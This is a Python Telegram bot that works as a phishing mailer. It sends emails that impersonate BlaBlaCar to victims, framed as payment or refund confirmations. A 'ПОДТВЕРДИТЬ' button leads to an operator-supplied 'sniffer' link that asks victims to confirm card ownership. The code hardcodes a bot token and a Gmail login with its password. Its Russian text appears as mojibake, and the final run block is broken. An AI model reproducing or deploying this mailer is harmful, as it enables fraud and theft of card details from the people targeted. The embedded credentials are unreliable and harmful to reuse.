import telebot
from telebot import types

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from email.header import Header
from email.utils import formataddr

import random

body = """"""

token = '1917850999:AAE-oToU73zT-HsoMMMMcLh4f2-0accEUB4'
bot = telebot.TeleBot(token)

systemText = ''
typeText = ''
emailText = ''
myNameText = ''
notMyNameText = ''
countOfPassangersText = ''
snifferText = ''

@bot.message_handler(commands=['start', 'mail'])
def handler(message):
	if message.text == '/start':
		bot.reply_to(message, '–ü—Ä–∏–≤–µ—Ç, –¥–æ—Ä–æ–≥–æ–π –¥—Ä—É–≥!\n–≠—Ç–æ—Ç –±–æ—Ç –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç AkulaTeam. –î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ª–∏—á–Ω–æ—Å—Ç–∏, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞–ø–∏—à–∏ @gektor1337. –ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–µ–π, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ /mail –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.')
	if message.text == '/mail':
		markup1 = types.InlineKeyboardMarkup()
		item1 = types.InlineKeyboardButton('BlaBlaCarüá∏üá∞', callback_data='bbc')
		item2 = types.InlineKeyboardButton('Avitoüá∏üá∞', callback_data='avito')
		markup1.add(item1, item2)
		
		try:
			text = open('users.txt').read()
		except:
			bot.send_message(message.from_user.id, '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏! Aborting...')
			print('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏! Aborting...')
		
		if str(message.from_user.id) in text:
			bot.send_message(message.from_user.id, '–ö–æ–º—É –í—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ?', reply_markup=markup1)
			print('\n\n\n' + str(message.from_user.id) + ' –µ—Å—Ç—å –≤ —Å–ø–∏—Å–∫–µ!')
			checking = 1;
		else:
			bot.send_message(message.from_user.id, '–í–∞—Å –Ω–µ—Ç –≤ —Å–ø–∏—Å–∫–µ! –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É –ø–æ–ª—É—á–∏—Ç–µ –¥–æ—Å—Ç—É–ø —É @gektor1337')
			print('\n\n\n' + str(message.from_user.id) + ' –Ω–µ—Ç –≤ —Å–ø–∏—Å–∫–µ!')

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
	global systemText
	global typeText
	global emailText
	global myNameText
	global notMyNameText
	global countOfPassangersText
	global snifferText
	
	try:
		if call.message:
			if call.data == 'bbc':
				systemText = 'BlaBlaCarüá∏üá∞'
				markup4 = types.InlineKeyboardMarkup()
				item1 = types.InlineKeyboardButton('–û–ø–ª–∞—Ç–∞', callback_data='bbcpay')
				item2 = types.InlineKeyboardButton('–í–æ–∑–≤—Ä–∞—Ç', callback_data='bbcreturn')
				item3 = types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='menuback')
				markup4.add(item1, item2, item3)
				
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–°–µ—Ä–≤–∏—Å: BlaBlaCarüá∏üá∞\n–£–∫–∞–∂–∏—Ç–µ —Ç–∏–ø.', reply_markup=markup4)
			if call.data == 'avito':
				systemText = 'Avitoüá∏üá∞'
				markup5 = types.InlineKeyboardMarkup()
				item1 = types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='menuback')
				markup5.add(item1)
				
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–°–µ—Ä–≤–∏—Å: Avitoüá∏üá∞\n–í —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ.', reply_markup=markup5)
			if call.data == 'menuback':
				markup1 = types.InlineKeyboardMarkup()
				item1 = types.InlineKeyboardButton('BlaBlaCarüá∏üá∞', callback_data='bbc')
				item2 = types.InlineKeyboardButton('Avitoüá∏üá∞', callback_data='avito')
				markup1.add(item1, item2)
				
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–ö–æ–º—É –í—ã —Ö–æ—Ç–∏—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ?', reply_markup=markup1)
			if call.data == 'bbcyes':
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–î–∞–Ω–Ω—ã–µ –≤–µ—Ä–Ω—ã.', reply_markup=None)
				markup3 = types.InlineKeyboardMarkup()
				item1 = types.InlineKeyboardButton('–û—Ç–ø—Ä–∞–≤–∏—Ç—å', callback_data='bbcsend')
				markup3.add(item1)
				
				bot.send_message(call.message.chat.id, '–í–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≥–æ—Ç–æ–≤–æ –∫ –æ—Ç–ø—Ä–∞–≤–∫–µ.', reply_markup=markup3)
			if call.data == 'bbcno':
				bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–î–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ /mail.', reply_markup=None)
			if call.data == 'bbcsend':
				global body
				
				if typeText == '–û–ø–ª–∞—Ç–∞':
					changeBodyTextTypePay(myNameText, notMyNameText, countOfPassangersText, snifferText)
				if typeText == '–í–æ–∑–≤—Ä–∞—Ç':
					changeBodyTextTypeReturn(notMyNameText, snifferText)
				
				msg = MIMEMultipart()
				msg['From'] = formataddr(('BlaBlaCar', 'garantblablacar@gmail.com'))
				msg['To'] = emailText
				msg['Subject'] = 'Reply ' + str(random.randint(1111, 9999))
					
				msg.attach(MIMEText(body, 'html'))
				server = smtplib.SMTP('smtp.gmail.com:587')
				server.starttls()
				server.login('garantblablacar@gmail.com', 'garantblablacar1987')
				text = msg.as_string()
				try:
					server.sendmail(msg['From'], msg['To'], text)
					bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!', reply_markup=None)
					print('\n\n\n–ù–æ–≤—ã–π –ª–æ–≥!\nTelegram name: ' + call.from_user.first_name + ';\nTelegram username: ' + call.from_user.username + ';\nE-mail –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + emailText + ';\n–ò–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è –≤ —Ä–æ–¥. –ø–∞–¥–µ–∂–µ: ' + myNameText + ';\n–ò–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + notMyNameText + ';\n–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Å—Å–∞–∂–∏—Ä–æ–≤: ' + countOfPassangersText + ';\n–°—Å—ã–ª–∫–∞ –Ω–∞ —Å–Ω–∏—Ñ—Ñ–µ—Ä: ' + snifferText + '.')
					f = open ('log.txt', 'a')
					f.write('\n\n\n–ù–æ–≤—ã–π –ª–æ–≥!\nTelegram name: ' + call.from_user.first_name + '\nTelegram username: ' + call.from_user.username + '\nE-mail –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + emailText + '\n–ò–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è: ' + myNameText + '\n–ò–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + notMyNameText + '\n–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Å—Å–∞–∂–∏—Ä–æ–≤: ' + countOfPassangersText + '\n–°—Å—ã–ª–∫–∞ –Ω–∞ —Å–Ω–∏—Ñ—Ñ–µ—Ä: ' + snifferText + '.')
					f.close()
				except:
					bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–û—à–∏–±–∫–∞!', reply_markup=None)
				server.quit()
				
				systemText = ''
				emailText = ''
				myNameText = ''
				notMyNameText = ''
				countOfPassangersText = ''
				snifferText = ''
				body = ''
				
				bot.send_message(call.message.chat.id, '–î–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ /mail.')
			if call.data == 'bbcpay':
				typeText = '–û–ø–ª–∞—Ç–∞'
				msg = bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–°–µ—Ä–≤–∏—Å: BlaBlaCarüá∏üá∞\n–¢–∏–ø: ' + typeText + '.\n–í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É –ø–æ–ª—É—á–∞—Ç–µ–ª—è!', reply_markup=None)
				bot.register_next_step_handler(msg, getEmail)
			if call.data == 'bbcreturn':
				typeText = '–í–æ–∑–≤—Ä–∞—Ç'
				msg = bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='–°–µ—Ä–≤–∏—Å: BlaBlaCarüá∏üá∞\n–¢–∏–ø: ' + typeText + '.\n–í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É –ø–æ–ª—É—á–∞—Ç–µ–ª—è!', reply_markup=None)
				bot.register_next_step_handler(msg, getEmail)
				
	except Exception as e:
		print(repr(e))

def changeBodyTextTypePay(myNameText, notMyNameText, countOfPassangersText, snifferText):
	global body
	body = """
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>BlaBlaCar</title>
  <style>
   .btn {
    display: inline-block;
    background: #0084ff;
    color: #fff;
    padding: 1rem 1.5rem;
    text-decoration: none;
    border-radius: 20px;
   }
   .txt {
    color: #000000;
   }
   .body {
   	background: #fff;
   	border-radius: 20px;
   }
  </style>
 </head>
 <body class="body">
  <p><img src="https://i.yapx.ru/Ngy6L.jpg" alt="" width="450" height="200" /></p>
  <p>–î–æ–±—Ä–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ —Å—É—Ç–æ–∫, """ + notMyNameText + """!<br><br><br>–ü–æ—Å—Ç—É–ø–∏–ª –∑–∞–ø—Ä–æ—Å –Ω–∞ –æ–Ω–ª–∞–π–Ω-–±—Ä–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–µ–∑–¥–∫–∏ –æ—Ç <font size="2" face="Arial"><u>""" + myNameText + """</u></font>, –Ω–∞ """ + countOfPassangersText + """.<br><br>–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã –ø–æ–µ–∑–¥–∫–∏, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É <font color="red">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</font>, –ø–æ—Å–ª–µ —á–µ–≥–æ –∑–∞–ø–æ–ª–Ω–∏—Ç–µ —Ñ–æ—Ä–º—É –ø–æ–µ–∑–¥–∫–∏.<br><br><br>–î–æ –Ω–∞—á–∞–ª–∞ –ø–æ–µ–∑–¥–∫–∏ –≤—Å–µ –∑–∞—á–∏—Å–ª–µ–Ω–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è —É –í–∞—Å –≤ –∫–æ—à–µ–ª—å–∫–µ BlaBlaCar.<br>–ü—Ä–∏ –æ—Ç–º–µ–Ω–µ –ø–æ–µ–∑–¥–∫–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞—á–∏—Å–ª—è—é—Ç—Å—è –í–∞–º –Ω–∞ –∫–∞—Ä—Ç—É.<br><br><br><br><br><div style="text-align: center"><p>–°—á–∞—Å—Ç–ª–∏–≤–æ–≥–æ –ø—É—Ç–∏!<br>¬©BlaBlaCar<br><font size="1">16.09.2006-2021</font></p></div></p>
  <div style="text-align: left"><p><font size="0.5" face="Arial">–í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã. –í—Å–µ —Ç–æ—Ä–≥–æ–≤—ã–µ –º–∞—Ä–∫–∏ —è–≤–ª—è—é—Ç—Å—è —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å—é —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏—Ö –≤–ª–∞–¥–µ–ª—å—Ü–µ–≤ –≤ –†–æ—Å—Å–∏–∏ –∏ –¥—Ä—É–≥–∏—Ö —Å—Ç—Ä–∞–Ω–∞—Ö.</font></p></div>
  <div style="text-align: center">
   <a href=""" + snifferText + """ class="btn">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</a>
  </div>
 </body>
 </body>
</html>
"""

def changeBodyTextTypeReturn(notMyNameText, snifferText):
	global body
	body = """
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
 <head>
  <title>BlaBlaCar</title>
  <style>
   .btn {
    display: inline-block;
    background: #0084ff;
    color: #fff;
    padding: 1rem 1.5rem;
    text-decoration: none;
    border-radius: 20px;
   }
   .txt {
    color: #000000;
   }
   .body {
   	background: #fff;
   	border-radius: 20px;
   }
  </style>
 </head>
 <body class="body">
  <p><img src="https://i.yapx.ru/Ngy6L.jpg" alt="" width="450" height="200" /></p>
  <p>–î–æ–±—Ä–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ —Å—É—Ç–æ–∫, """ + notMyNameText + """!<br><br><br>–ü–æ—Å—Ç—É–ø–∏–ª –∑–∞–ø—Ä–æ—Å –Ω–∞ <font size="2" face="Arial"><u>–≤–æ–∑–≤—Ä–∞—Ç —Å—Ä–µ–¥—Å—Ç–≤</u></font>.<br><br>–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤–æ–∑–≤—Ä–∞—Ç–∞ —Å—Ä–µ–¥—Å—Ç–≤, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É <font color="red">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</font>, –ø–æ—Å–ª–µ —á–µ–≥–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –∏–º–µ–Ω–Ω–æ –í—ã –≤–ª–∞–¥–µ–ª–µ—Ü –∫–∞—Ä—Ç—ã.<br><br><br><br><br><div style="text-align: center"><p>–°—á–∞—Å—Ç–ª–∏–≤–æ–≥–æ –ø—É—Ç–∏!<br>¬©BlaBlaCar<br><font size="1">16.09.2006-2021</font></p></div></p>
  <div style="text-align: left"><p><font size="0.5" face="Arial">–í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã. –í—Å–µ —Ç–æ—Ä–≥–æ–≤—ã–µ –º–∞—Ä–∫–∏ —è–≤–ª—è—é—Ç—Å—è —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å—é —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏—Ö –≤–ª–∞–¥–µ–ª—å—Ü–µ–≤ –≤ –†–æ—Å—Å–∏–∏ –∏ –¥—Ä—É–≥–∏—Ö —Å—Ç—Ä–∞–Ω–∞—Ö.</font></p></div>
  <div style="text-align: center">
   <a href=""" + snifferText + """ class="btn">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</a>
  </div>
 </body>
 </body>
</html>
"""

def getEmail(message):
	global typeText
	global emailText
	emailText = str(message.text)
	if typeText == '–û–ø–ª–∞—Ç–∞':
		msg = bot.send_message(message.from_user.id, '–≠–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞—è –ø–æ—á—Ç–∞ –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + emailText + '. –í–≤–µ–¥–∏—Ç–µ –∏–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è –≤ —Ä–æ–¥–∏—Ç–µ–ª—å–Ω–æ–º –ø–∞–¥–µ–∂–µ.')
		bot.register_next_step_handler(msg, getMyName)
	if typeText == '–í–æ–∑–≤—Ä–∞—Ç':
		msg = bot.send_message(message.from_user.id, '–≠–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞—è –ø–æ—á—Ç–∞ –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + emailText + '. –í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è.')
		bot.register_next_step_handler(msg, getNotMyName)

def getMyName(message):
	global myNameText
	myNameText = str(message.text)
	msg = bot.send_message(message.from_user.id, '–ò–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è: ' + myNameText + '. –í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è.')
	bot.register_next_step_handler(msg, getNotMyName)
		
def getNotMyName(message):
	global typeText
	global notMyNameText
	notMyNameText = str(message.text)
	if typeText == '–û–ø–ª–∞—Ç–∞':
		msg = bot.send_message(message.from_user.id, '–ò–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + notMyNameText + '. –í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Å—Å–∞–∂–∏—Ä–æ–≤ + —Å–ª–æ–≤–æ "—á–µ–ª–æ–≤–µ–∫". –ü—Ä–∏–º–µ—Ä: 5 —á–µ–ª–æ–≤–µ–∫, 2 —á–µ–ª–æ–≤–µ–∫–∞, 1 —á–µ–ª–æ–≤–µ–∫–∞.')
		bot.register_next_step_handler(msg, getCountOfPassangers)
	if typeText == '–í–æ–∑–≤—Ä–∞—Ç':
		msg = bot.send_message(message.from_user.id, '–ò–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + notMyNameText + '. –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Å–Ω–∏—Ñ—Ñ–µ—Ä.')
		bot.register_next_step_handler(msg, getSniffer)

def getCountOfPassangers(message):
	global countOfPassangersText
	countOfPassangersText = str(message.text)
	
	msg = bot.send_message(message.from_user.id, '–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Å—Å–∞–∂–∏—Ä–æ–≤: ' + countOfPassangersText + '. –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Å–Ω–∏—Ñ—Ñ–µ—Ä.')
	bot.register_next_step_handler(msg, getSniffer)

def getSniffer(message):
	global systemText
	global typeText
	global emailText
	global myNameText
	global notMyNameText
	global countOfPassangersText
	global snifferText
	
	snifferText = str(message.text)
	
	markup2 = types.InlineKeyboardMarkup()
	item1 = types.InlineKeyboardButton('–í–µ—Ä–Ω–æ', callback_data='bbcyes')
	item2 = types.InlineKeyboardButton('–ù–µ –≤–µ—Ä–Ω–æ', callback_data='bbcno')
	markup2.add(item1, item2)
	
	if typeText == '–û–ø–ª–∞—Ç–∞':
		bot.send_message(message.from_user.id, '–°–∏—Å—Ç–µ–º–∞: ' + systemText + '\nEmail –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + emailText + '\n–ò–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è –≤ —Ä–æ–¥. –ø–∞–¥–µ–∂–µ: ' + myNameText + '\n–ò–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + notMyNameText + '\n–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Å—Å–∞–∂–∏—Ä–æ–≤: ' + countOfPassangersText + '\n–°—Å—ã–ª–∫–∞ –Ω–∞ —Å–Ω–∏—Ñ—Ñ–µ—Ä: ' + snifferText + '.', reply_markup=markup2)
	if typeText == '–í–æ–∑–≤—Ä–∞—Ç':
		bot.send_message(message.from_user.id, '–°–∏—Å—Ç–µ–º–∞: ' + systemText + '\nEmail –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + emailText + '\n–ò–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ' + notMyNameText + '\n–°—Å—ã–ª–∫–∞ –Ω–∞ —Å–Ω–∏—Ñ—Ñ–µ—Ä: ' + snifferText + '.', reply_markup=markup2)

if __name__ == '__main__':
        run(host='0.0.0.0', port=os.environ.get('PORT', '5000'))
	bot.polling(none_stop=True)

#Termux: cd $HOME && cp -r /storage/emulated/0/EmailSender $HOME && python3 EmailSender/Telegram.py
